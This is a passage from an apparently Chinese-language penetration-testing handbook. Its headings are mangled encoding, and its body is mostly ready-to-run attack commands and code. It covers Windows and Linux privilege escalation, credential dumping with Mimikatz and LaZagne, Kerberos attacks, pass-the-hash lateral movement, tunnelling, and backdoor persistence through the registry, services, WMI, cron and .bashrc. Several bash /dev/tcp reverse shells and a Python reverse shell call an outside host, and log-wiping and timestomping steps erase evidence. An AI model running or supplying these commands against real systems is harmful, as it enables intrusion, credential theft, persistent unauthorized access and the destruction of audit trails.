config set dbfilename root
set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1\n"
save
</code></pre>
<hr />
<h2 id="4-æƒé™æå‡"><a class="header" href="#4-æƒé™æå‡">4. æƒé™æå‡</a></h2>
<h3 id="41-windowsæƒé™æå‡"><a class="header" href="#41-windowsæƒé™æå‡">4.1 Windowsæƒé™æå‡</a></h3>
<h4 id="uacç»•è¿‡"><a class="header" href="#uacç»•è¿‡">UACç»•è¿‡</a></h4>
<p><strong>å¸¸ç”¨æ–¹æ³•</strong>:</p>
<pre><code class="language-powershell"># eventvwr.exeç»•è¿‡ï¼ˆé€‚ç”¨äºWin7-Win10ï¼‰
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
Start-Process "eventvwr.exe"

# fodhelper.exeç»•è¿‡ï¼ˆWin10ï¼‰
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
Start-Process "fodhelper.exe"
</code></pre>
<h4 id="æœåŠ¡æƒé™æ»¥ç”¨"><a class="header" href="#æœåŠ¡æƒé™æ»¥ç”¨">æœåŠ¡æƒé™æ»¥ç”¨</a></h4>
<p><strong>ä¸å®‰å…¨æœåŠ¡æƒé™</strong>:</p>
<pre><code class="language-powershell"># æšä¸¾å¯ä¿®æ”¹çš„æœåŠ¡
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService

# PowerUpæšä¸¾
Invoke-AllChecks

# åˆ©ç”¨unquotedæœåŠ¡è·¯å¾„
# æœåŠ¡è·¯å¾„: C:\Program Files\Some Service\service.exe
# å°è¯•åˆ›å»º: C:\Program.exe æˆ– C:\Program Files\Some.exe

# åˆ©ç”¨å¯å†™æœåŠ¡äºŒè¿›åˆ¶
sc qc vulnerable_service
icacls "C:\path\to\service.exe"
# æ›¿æ¢æœåŠ¡äºŒè¿›åˆ¶ä¸ºæ¶æ„ç¨‹åº
</code></pre>
<h4 id="tokençªƒå–"><a class="header" href="#tokençªƒå–">Tokençªƒå–</a></h4>
<p><strong>Tokenæ“ä½œ</strong>:</p>
<pre><code class="language-powershell"># åˆ—ä¸¾è¿›ç¨‹Token
Invoke-TokenManipulation -Enumerate

# çªƒå–SYSTEM Token
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# ä½¿ç”¨Incognitoï¼ˆMeterpreterï¼‰
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
</code></pre>
<h4 id="å†…æ ¸æ¼æ´åˆ©ç”¨"><a class="header" href="#å†…æ ¸æ¼æ´åˆ©ç”¨">å†…æ ¸æ¼æ´åˆ©ç”¨</a></h4>
<p><strong>å¸¸è§å†…æ ¸ææƒæ¼æ´</strong>:</p>
<pre><code class="language-bash"># MS16-032ï¼ˆWin7/8/10ï¼‰
Invoke-MS16032

# MS15-051ï¼ˆWin7/8/Server 2008/2012ï¼‰
use exploit/windows/local/ms15_051_client_copy_image

# MS14-058ï¼ˆWin7/8/Server 2008/2012ï¼‰
use exploit/windows/local/ms14_058_track_popup_menu

# è‡ªåŠ¨åŒ–æšä¸¾
./windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
</code></pre>
<h3 id="42-linuxæƒé™æå‡"><a class="header" href="#42-linuxæƒé™æå‡">4.2 Linuxæƒé™æå‡</a></h3>
<h4 id="suidsgidæ»¥ç”¨"><a class="header" href="#suidsgidæ»¥ç”¨">SUID/SGIDæ»¥ç”¨</a></h4>
<p><strong>æŸ¥æ‰¾SUIDç¨‹åº</strong>:</p>
<pre><code class="language-bash"># æŸ¥æ‰¾æ‰€æœ‰SUIDç¨‹åº
find / -perm -4000 -type f 2&gt;/dev/null

# å¸¸è§å¯åˆ©ç”¨çš„SUIDç¨‹åº
find / -name vim* -exec ls -l {} \; 2&gt;/dev/null
find / -name nmap* -exec ls -l {} \; 2&gt;/dev/null
find / -name python* -exec ls -l {} \; 2&gt;/dev/null
</code></pre>
<p><strong>åˆ©ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-bash"># vimææƒ
vim -c ':!/bin/bash'

# nmapææƒï¼ˆæ—§ç‰ˆæœ¬ï¼‰
nmap --interactive
!sh

# findææƒ
find /home -exec /bin/bash \;

# pythonææƒ
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
</code></pre>
<h4 id="å®šæ—¶ä»»åŠ¡åŠ«æŒ"><a class="header" href="#å®šæ—¶ä»»åŠ¡åŠ«æŒ">å®šæ—¶ä»»åŠ¡åŠ«æŒ</a></h4>
<pre><code class="language-bash"># æŸ¥æ‰¾å¯å†™çš„cronä»»åŠ¡
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# æŸ¥æ‰¾å¯å†™çš„è„šæœ¬
find /etc/cron* -type f -perm -o+w 2&gt;/dev/null

# åˆ©ç”¨PATHåŠ«æŒ
# åœ¨è„šæœ¬ä¸­åˆ›å»ºæ¶æ„åŒåå‘½ä»¤
echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1' &gt; /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
</code></pre>
<h4 id="å†…æ ¸æ¼æ´åˆ©ç”¨-1"><a class="header" href="#å†…æ ¸æ¼æ´åˆ©ç”¨-1">å†…æ ¸æ¼æ´åˆ©ç”¨</a></h4>
<p><strong>è„ç‰›ï¼ˆDirty COWï¼‰</strong>:</p>
<pre><code class="language-bash"># CVE-2016-5195æ£€æµ‹
uname -a
cat /etc/issue

# ç¼–è¯‘åˆ©ç”¨
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# åˆ©ç”¨å
su firefart  # å¯†ç : password
</code></pre>
<p><strong>å¸¸ç”¨ææƒå·¥å…·</strong>:</p>
<pre><code class="language-bash"># LinEnum
./LinEnum.sh

# linpeas
./linpeas.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh

# BeRoot
python beroot.py
</code></pre>
<hr />
<h2 id="5-æ¨ªå‘ç§»åŠ¨æŠ€æœ¯"><a class="header" href="#5-æ¨ªå‘ç§»åŠ¨æŠ€æœ¯">5. æ¨ªå‘ç§»åŠ¨æŠ€æœ¯</a></h2>
<h3 id="51-å‡­è¯è·å–"><a class="header" href="#51-å‡­è¯è·å–">5.1 å‡­è¯è·å–</a></h3>
<h4 id="windowså¯†ç å“ˆå¸Œæå–"><a class="header" href="#windowså¯†ç å“ˆå¸Œæå–">Windowså¯†ç å“ˆå¸Œæå–</a></h4>
<p><strong>Mimikatz</strong>:</p>
<pre><code class="language-powershell"># ææƒåˆ°SYSTEM
privilege::debug
token::elevate

# æå–æ˜æ–‡å¯†ç 
sekurlsa::logonpasswords

# æå–å“ˆå¸Œ
lsadump::sam
lsadump::secrets

# æå–Kerberosç¥¨æ®
sekurlsa::tickets /export

# é»„é‡‘ç¥¨æ®
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# ç™½é“¶ç¥¨æ®
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /ptt
</code></pre>
<p><strong>Procdump + Mimikatz</strong>:</p>
<pre><code class="language-bash"># 1. ä½¿ç”¨Procdumpå¯¼å‡ºlsass
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 2. ç¦»çº¿è§£æ
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
</code></pre>
<p><strong>LaZagne</strong>:</p>
<pre><code class="language-bash"># æå–æ‰€æœ‰å¯†ç 
laZagne.exe all

# æå–æµè§ˆå™¨å¯†ç 
laZagne.exe browsers

# æå–ç³»ç»Ÿå¯†ç 
laZagne.exe sysadmin
</code></pre>
<h4 id="kerberosæ”»å‡»"><a class="header" href="#kerberosæ”»å‡»">Kerberosæ”»å‡»</a></h4>
<p><strong>Kerberoasting</strong>:</p>
<pre><code class="language-powershell"># è¯·æ±‚æœåŠ¡ç¥¨æ®
Get-DomainUser -SPN
Request-SPNTicket -SPN "MSSQLSvc/server.domain.com:1433"

# å¯¼å‡ºç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::list /export"'

# ç¦»çº¿ç ´è§£
python tgsrepcrack.py wordlist.txt ticket.kirbi
hashcat -m 13100 ticket.hash wordlist.txt
</code></pre>
<p><strong>AS-REP Roasting</strong>:</p>
<pre><code class="language-bash"># æšä¸¾ä¸éœ€è¦é¢„è®¤è¯çš„ç”¨æˆ·
Get-DomainUser -PreauthNotRequired

# è¯·æ±‚AS-REP
GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# ç ´è§£å“ˆå¸Œ
hashcat -m 18200 asrep.hash wordlist.txt
</code></pre>
<h4 id="æµè§ˆå™¨å¯†ç æå–"><a class="header" href="#æµè§ˆå™¨å¯†ç æå–">æµè§ˆå™¨å¯†ç æå–</a></h4>
<pre><code class="language-powershell"># Chromeå¯†ç æå–
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# è§£å¯†éœ€è¦ç”¨æˆ·DPAPIå¯†é’¥

# Firefoxå¯†ç æå–
# æŸ¥æ‰¾key4.dbå’Œlogins.json

# Edgeå¯†ç 
$edgeData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
</code></pre>
<h3 id="52-æ¨ªå‘ç§»åŠ¨æŠ€æœ¯"><a class="header" href="#52-æ¨ªå‘ç§»åŠ¨æŠ€æœ¯">5.2 æ¨ªå‘ç§»åŠ¨æŠ€æœ¯</a></h3>
<h4 id="psexec"><a class="header" href="#psexec">PsExec</a></h4>
<pre><code class="language-bash"># å®˜æ–¹PsExec
PsExec.exe \\192.168.1.10 -u domain\admin -p password cmd.exe

# Metasploit PsExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser admin
set SMBPass password
exploit

# Impacket PsExec
psexec.py domain/admin:password@192.168.1.10
</code></pre>
<h4 id="wmiè¿œç¨‹æ‰§è¡Œ"><a class="header" href="#wmiè¿œç¨‹æ‰§è¡Œ">WMIè¿œç¨‹æ‰§è¡Œ</a></h4>
<pre><code class="language-powershell"># PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName 192.168.1.10 -Credential $cred

# WMICå‘½ä»¤
wmic /node:192.168.1.10 /user:domain\admin /password:password process call create "cmd.exe /c calc.exe"

# Impacket wmiexec
wmiexec.py domain/admin:password@192.168.1.10
</code></pre>
<h4 id="powershell-remoting"><a class="header" href="#powershell-remoting">PowerShell Remoting</a></h4>
<pre><code class="language-powershell"># å¯ç”¨PSRemoting
Enable-PSRemoting -Force

# è¿œç¨‹æ‰§è¡Œå‘½ä»¤
Invoke-Command -ComputerName 192.168.1.10 -Credential domain\admin -ScriptBlock {whoami}

# è¿›å…¥äº¤äº’å¼ä¼šè¯
Enter-PSSession -ComputerName 192.168.1.10 -Credential domain\admin

# æ‰¹é‡æ‰§è¡Œ
Invoke-Command -ComputerName 192.168.1.10,192.168.1.11 -ScriptBlock {Get-Process}
</code></pre>
<h4 id="pass-the-hashæ”»å‡»"><a class="header" href="#pass-the-hashæ”»å‡»">Pass-the-Hashæ”»å‡»</a></h4>
<pre><code class="language-bash"># Mimikatz PTH
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe

# Impacket PTH
psexec.py -hashes :ntlmhash domain/admin@192.168.1.10
wmiexec.py -hashes :ntlmhash domain/admin@192.168.1.10
smbexec.py -hashes :ntlmhash domain/admin@192.168.1.10
</code></pre>
<h3 id="53-éš§é“æŠ€æœ¯"><a class="header" href="#53-éš§é“æŠ€æœ¯">5.3 éš§é“æŠ€æœ¯</a></h3>
<h4 id="sshéš§é“"><a class="header" href="#sshéš§é“">SSHéš§é“</a></h4>
<p><strong>æœ¬åœ°ç«¯å£è½¬å‘</strong>:</p>
<pre><code class="language-bash"># è®¿é—®å†…ç½‘æœåŠ¡
ssh -L 8080:192.168.1.10:80 user@jump-server
# æœ¬åœ°è®¿é—® http://localhost:8080

# è®¿é—®å†…ç½‘æ•°æ®åº“
ssh -L 3306:192.168.1.20:3306 user@jump-server
mysql -h 127.0.0.1 -P 3306 -u root -p
</code></pre>
<p><strong>è¿œç¨‹ç«¯å£è½¬å‘</strong>:</p>
<pre><code class="language-bash"># å°†å†…ç½‘æœåŠ¡æš´éœ²åˆ°å…¬ç½‘
ssh -R 8080:localhost:80 user@public-server
# å…¬ç½‘è®¿é—® http://public-server:8080

# åå‘Shell
ssh -R 4444:localhost:22 user@attacker-server
</code></pre>
<p><strong>åŠ¨æ€ç«¯å£è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰</strong>:</p>
<pre><code class="language-bash"># åˆ›å»ºSOCKSä»£ç†
ssh -D 1080 user@jump-server

# é…åˆproxychainsä½¿ç”¨
proxychains nmap -sT 192.168.1.0/24
proxychains firefox
</code></pre>
<h4 id="httphttpséš§é“"><a class="header" href="#httphttpséš§é“">HTTP/HTTPSéš§é“</a></h4>
<p><strong>reGeorg</strong>:</p>
<pre><code class="language-bash"># 1. ä¸Šä¼ tunnelè„šæœ¬ï¼ˆtunnel.aspx/jsp/phpï¼‰
# 2. å¯åŠ¨ä»£ç†
python reGeorgSocksProxy.py -u http://target.com/tunnel.aspx -p 1080

# 3. ä½¿ç”¨ä»£ç†
proxychains curl http://192.168.1.10
</code></pre>
<p><strong>Neo-reGeorgï¼ˆåŠ å¯†ç‰ˆï¼‰</strong>:</p>
<pre><code class="language-bash"># ç”ŸæˆåŠ å¯†éš§é“
python neoreg.py generate -k password

# å¯åŠ¨å®¢æˆ·ç«¯
python neoreg.py -k password -u http://target.com/tunnel.php
</code></pre>
<h4 id="dnséš§é“"><a class="header" href="#dnséš§é“">DNSéš§é“</a></h4>
<p><strong>dnscat2</strong>:</p>
<pre><code class="language-bash"># æœåŠ¡ç«¯
dnscat2-server domain.com

# å®¢æˆ·ç«¯ï¼ˆWindowsï¼‰
dnscat2.exe domain.com

# å®¢æˆ·ç«¯ï¼ˆLinuxï¼‰
./dnscat domain.com
</code></pre>
<p><strong>iodine</strong>:</p>
<pre><code class="language-bash"># æœåŠ¡ç«¯
iodined -f -P password 10.0.0.1 tunnel.domain.com

# å®¢æˆ·ç«¯
iodine -f -P password tunnel.domain.com
</code></pre>
<h4 id="ç«¯å£è½¬å‘å·¥å…·"><a class="header" href="#ç«¯å£è½¬å‘å·¥å…·">ç«¯å£è½¬å‘å·¥å…·</a></h4>
<p><strong>Chisel</strong>:</p>
<pre><code class="language-bash"># æœåŠ¡ç«¯
chisel server -p 8000 --reverse

# å®¢æˆ·ç«¯ï¼ˆæ­£å‘ä»£ç†ï¼‰
chisel client server-ip:8000 8080:192.168.1.10:80

# å®¢æˆ·ç«¯ï¼ˆåå‘ä»£ç†ï¼‰
chisel client server-ip:8000 R:socks
</code></pre>
<p><strong>Frp</strong>:</p>
<pre><code class="language-ini"># frps.iniï¼ˆæœåŠ¡ç«¯ï¼‰
[common]
bind_port = 7000

# frpc.iniï¼ˆå®¢æˆ·ç«¯ï¼‰
[common]
server_addr = server-ip
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
</code></pre>
<hr />
<h2 id="6-æŒä¹…åŒ–æœºåˆ¶"><a class="header" href="#6-æŒä¹…åŒ–æœºåˆ¶">6. æŒä¹…åŒ–æœºåˆ¶</a></h2>
<h3 id="61-windowsæŒä¹…åŒ–"><a class="header" href="#61-windowsæŒä¹…åŒ–">6.1 WindowsæŒä¹…åŒ–</a></h3>
<h4 id="æ³¨å†Œè¡¨å¯åŠ¨é¡¹"><a class="header" href="#æ³¨å†Œè¡¨å¯åŠ¨é¡¹">æ³¨å†Œè¡¨å¯åŠ¨é¡¹</a></h4>
<pre><code class="language-powershell"># Runé”®
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# RunOnceé”®
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# Winlogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
</code></pre>
<h4 id="è®¡åˆ’ä»»åŠ¡"><a class="header" href="#è®¡åˆ’ä»»åŠ¡">è®¡åˆ’ä»»åŠ¡</a></h4>
<pre><code class="language-powershell"># åˆ›å»ºæ¯æ—¥ä»»åŠ¡
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc daily /st 09:00

# åˆ›å»ºç™»å½•è§¦å‘ä»»åŠ¡
schtasks /create /tn "SystemCheck" /tr "powershell.exe -enc &lt;base64&gt;" /sc onlogon /ru System

# éšè”½ä»»åŠ¡ï¼ˆXMLå¯¼å…¥ï¼‰
schtasks /create /tn "GoogleUpdate" /xml task.xml
</code></pre>
<h4 id="æœåŠ¡å®‰è£…"><a class="header" href="#æœåŠ¡å®‰è£…">æœåŠ¡å®‰è£…</a></h4>
<pre><code class="language-powershell"># åˆ›å»ºæœåŠ¡
sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
sc description "WindowsUpdate" "Windows Update Service"
sc start "WindowsUpdate"

# PowerShellåˆ›å»º
New-Service -Name "BackdoorSvc" -BinaryPathName "C:\backdoor.exe" -StartupType Automatic
</code></pre>
<h4 id="wmiäº‹ä»¶è®¢é˜…"><a class="header" href="#wmiäº‹ä»¶è®¢é˜…">WMIäº‹ä»¶è®¢é˜…</a></h4>
<pre><code class="language-powershell"># åˆ›å»ºWMIæŒä¹…åŒ–
$FilterArgs = @{
    name='SystemBootFilter'
    EventNameSpace='root\CimV2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    name='SystemBootConsumer'
    CommandLineTemplate='powershell.exe -enc &lt;base64&gt;'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs
</code></pre>
<h4 id="dllåŠ«æŒ"><a class="header" href="#dllåŠ«æŒ">DLLåŠ«æŒ</a></h4>
<pre><code class="language-powershell"># æŸ¥æ‰¾å¯åŠ«æŒçš„DLL
# ä½¿ç”¨Process Monitorç›‘æ§ç¨‹åºåŠ è½½çš„DLL

# å¸¸è§åŠ«æŒç‚¹
# åº”ç”¨ç¨‹åºç›®å½•
# C:\Windows\System32
# PATHç¯å¢ƒå˜é‡ç›®å½•

# åˆ›å»ºæ¶æ„DLL
# DLLå¿…é¡»å¯¼å‡ºåŸDLLçš„æ‰€æœ‰å‡½æ•°
# åœ¨DllMainä¸­æ‰§è¡Œæ¶æ„ä»£ç 
</code></pre>
<h3 id="62-linuxæŒä¹…åŒ–"><a class="header" href="#62-linuxæŒä¹…åŒ–">6.2 LinuxæŒä¹…åŒ–</a></h3>
<h4 id="crontab"><a class="header" href="#crontab">Crontab</a></h4>
<pre><code class="language-bash"># ç”¨æˆ·crontab
(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# ç³»ç»Ÿcrontab
echo "*/5 * * * * root /tmp/backdoor.sh" &gt;&gt; /etc/crontab

# cron.dç›®å½•
echo "*/5 * * * * root /tmp/backdoor.sh" &gt; /etc/cron.d/backdoor
</code></pre>
<h4 id="sshå¯†é’¥"><a class="header" href="#sshå¯†é’¥">SSHå¯†é’¥</a></h4>
<pre><code class="language-bash"># æ·»åŠ å…¬é’¥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." &gt;&gt; ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ä¿®æ”¹sshdé…ç½®å…è®¸rootç™»å½•
echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config
systemctl restart sshd
</code></pre>
<h4 id="å¯åŠ¨è„šæœ¬"><a class="header" href="#å¯åŠ¨è„šæœ¬">å¯åŠ¨è„šæœ¬</a></h4>
<pre><code class="language-bash"># systemdæœåŠ¡
cat &gt; /etc/systemd/system/backdoor.service &lt;&lt;EOF
[Unit]
Description=System Monitoring Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# rc.localï¼ˆä¼ ç»Ÿæ–¹æ³•ï¼‰
echo "/tmp/backdoor.sh &amp;" &gt;&gt; /etc/rc.local
chmod +x /etc/rc.local
</code></pre>
<h4 id="bashrcåŠ«æŒ"><a class="header" href="#bashrcåŠ«æŒ">.bashrcåŠ«æŒ</a></h4>
<pre><code class="language-bash"># åœ¨ç”¨æˆ·.bashrcä¸­æ·»åŠ 
echo 'bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;' &gt;&gt; ~/.bashrc

# åœ¨/etc/bash.bashrcä¸­æ·»åŠ ï¼ˆå½±å“æ‰€æœ‰ç”¨æˆ·ï¼‰
echo 'bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;' &gt;&gt; /etc/bash.bashrc
</code></pre>
<hr />
<h2 id="7-ç—•è¿¹æ¸…ç†"><a class="header" href="#7-ç—•è¿¹æ¸…ç†">7. ç—•è¿¹æ¸…ç†</a></h2>
<h3 id="71-windowsæ—¥å¿—æ¸…ç†"><a class="header" href="#71-windowsæ—¥å¿—æ¸…ç†">7.1 Windowsæ—¥å¿—æ¸…ç†</a></h3>
<h4 id="äº‹ä»¶æ—¥å¿—æ¸…ç†"><a class="header" href="#äº‹ä»¶æ—¥å¿—æ¸…ç†">äº‹ä»¶æ—¥å¿—æ¸…ç†</a></h4>
<pre><code class="language-powershell"># æ¸…é™¤æ‰€æœ‰äº‹ä»¶æ—¥å¿—
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShellæ¸…é™¤
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# åˆ é™¤ç‰¹å®šäº‹ä»¶
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Remove-WinEvent

# ä½¿ç”¨å·¥å…·
# Invoke-Phant0m: ç»ˆæ­¢EventLogçº¿ç¨‹
# Phantom: æ— ç—•æ¸…ç†å·¥å…·
</code></pre>
<h4 id="iisæ—¥å¿—æ¸…ç†"><a class="header" href="#iisæ—¥å¿—æ¸…ç†">IISæ—¥å¿—æ¸…ç†</a></h4>
<pre><code class="language-powershell"># IISæ—¥å¿—ä½ç½®
# C:\inetpub\logs\LogFiles\

# åˆ é™¤åŒ…å«æ”»å‡»IPçš„æ—¥å¿—è¡Œ
$ip = "192.168.1.100"
Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -Filter *.log | ForEach {
    (Get-Content $_.FullName) | Where-Object { $_ -notmatch $ip } | Set-Content $_.FullName
}
</code></pre>
<h4 id="æ•°æ®åº“æ—¥å¿—"><a class="header" href="#æ•°æ®åº“æ—¥å¿—">æ•°æ®åº“æ—¥å¿—</a></h4>
<pre><code class="language-sql">-- MySQLæ—¥å¿—æ¸…ç†
SET GLOBAL general_log = 'OFF';
TRUNCATE TABLE mysql.general_log;

-- MSSQLæ—¥å¿—æ¸…ç†
EXEC sp_cycle_errorlog;
DBCC SHRINKFILE (ErrorLog, 1);
</code></pre>
<h3 id="72-æ–‡ä»¶ç—•è¿¹æ¸…ç†"><a class="header" href="#72-æ–‡ä»¶ç—•è¿¹æ¸…ç†">7.2 æ–‡ä»¶ç—•è¿¹æ¸…ç†</a></h3>
<h4 id="ä¸´æ—¶æ–‡ä»¶æ¸…ç†"><a class="header" href="#ä¸´æ—¶æ–‡ä»¶æ¸…ç†">ä¸´æ—¶æ–‡ä»¶æ¸…ç†</a></h4>
<pre><code class="language-powershell"># æ¸…ç†ä¸´æ—¶ç›®å½•
Remove-Item $env:TEMP\* -Recurse -Force
Remove-Item C:\Windows\Temp\* -Recurse -Force

# æ¸…ç†é¢„è¯»å–æ–‡ä»¶
Remove-Item C:\Windows\Prefetch\* -Force

# æ¸…ç†æœ€è¿‘æ–‡ä»¶
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
</code></pre>
<h4 id="æ—¶é—´æˆ³ä¿®æ”¹"><a class="header" href="#æ—¶é—´æˆ³ä¿®æ”¹">æ—¶é—´æˆ³ä¿®æ”¹</a></h4>
<pre><code class="language-powershell"># ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³
$(Get-Item file.exe).CreationTime = "2020-01-01 12:00:00"
$(Get-Item file.exe).LastWriteTime = "2020-01-01 12:00:00"
$(Get-Item file.exe).LastAccessTime = "2020-01-01 12:00:00"

# ä½¿ç”¨timestompï¼ˆMetasploitï¼‰
meterpreter &gt; timestomp file.exe -v
meterpreter &gt; timestomp file.exe -m "2020-01-01 12:00:00"
</code></pre>
<h4 id="å®‰å…¨åˆ é™¤æ–‡ä»¶"><a class="header" href="#å®‰å…¨åˆ é™¤æ–‡ä»¶">å®‰å…¨åˆ é™¤æ–‡ä»¶</a></h4>
<pre><code class="language-bash"># Windows - SDelete
sdelete.exe -p 7 file.exe

# Linux - shred
shred -vfz -n 10 file.txt

# è¦†ç›–å¼åˆ é™¤
dd if=/dev/urandom of=file.txt bs=1M count=10
rm file.txt
</code></pre>
<h3 id="73-linuxæ—¥å¿—æ¸…ç†"><a class="header" href="#73-linuxæ—¥å¿—æ¸…ç†">7.3 Linuxæ—¥å¿—æ¸…ç†</a></h3>
<pre><code class="language-bash"># æ¸…ç©ºæ—¥å¿—æ–‡ä»¶
cat /dev/null &gt; /var/log/auth.log
cat /dev/null &gt; /var/log/syslog
cat /dev/null &gt; ~/.bash_history

# åˆ é™¤ç‰¹å®šIPçš„æ—¥å¿—
sed -i '/192.168.1.100/d' /var/log/auth.log

# æ¸…é™¤history
history -c
history -w
unset HISTFILE

# ç¦ç”¨historyè®°å½•
export HISTSIZE=0
export HISTFILESIZE=0
</code></pre>
<hr />
<h2 id="8-å†…ç½‘æ¸—é€å·¥å…·å¼€å‘"><a class="header" href="#8-å†…ç½‘æ¸—é€å·¥å…·å¼€å‘">8. å†…ç½‘æ¸—é€å·¥å…·å¼€å‘</a></h2>
<h3 id="81-pythonè„šæœ¬å¼€å‘"><a class="header" href="#81-pythonè„šæœ¬å¼€å‘">8.1 Pythonè„šæœ¬å¼€å‘</a></h3>
<h4 id="ç«¯å£æ‰«æå™¨"><a class="header" href="#ç«¯å£æ‰«æå™¨">ç«¯å£æ‰«æå™¨</a></h4>
<pre><code class="language-python">import socket
import threading
from queue import Queue

def port_scan(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "Unknown"
            print(f"[+] {host}:{port} - {service}")
        sock.close()
    except:
        pass

def worker(host, queue):
    while not queue.empty():
        port = queue.get()
        port_scan(host, port)
        queue.task_done()

def scan(host, ports):
    queue = Queue()
    for port in ports:
        queue.put(port)

    for _ in range(100):  # 100ä¸ªçº¿ç¨‹
        t = threading.Thread(target=worker, args=(host, queue))
        t.daemon = True
        t.start()

    queue.join()

# ä½¿ç”¨ç¤ºä¾‹
scan("192.168.1.10", range(1, 65536))
</code></pre>
<h4 id="ç®€æ˜“åå¼¹shell"><a class="header" href="#ç®€æ˜“åå¼¹shell">ç®€æ˜“åå¼¹Shell</a></h4>
<pre><code class="language-python">import socket
import subprocess
import os

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        if command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(b'Changed directory\n')
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode() + b'\n')

    s.close()

# ä½¿ç”¨
reverse_shell('192.168.1.100', 4444)
</code></pre>
<h3 id="82-powershellè„šæœ¬å¼€å‘"><a class="header" href="#82-powershellè„šæœ¬å¼€å‘">8.2 PowerShellè„šæœ¬å¼€å‘</a></h3>
<h4 id="ä¿¡æ¯æ”¶é›†è„šæœ¬"><a class="header" href="#ä¿¡æ¯æ”¶é›†è„šæœ¬">ä¿¡æ¯æ”¶é›†è„šæœ¬</a></h4>
<pre><code class="language-powershell">function Get-SystemInfo {
    $info = @{}

    # ç³»ç»Ÿä¿¡æ¯
    $info['Hostname'] = $env:COMPUTERNAME
    $info['Username'] = $env:USERNAME
    $info['Domain'] = $env:USERDOMAIN
    $info['OS'] = (Get-WmiObject Win32_OperatingSystem).Caption

    # ç½‘ç»œä¿¡æ¯
    $info['IP'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
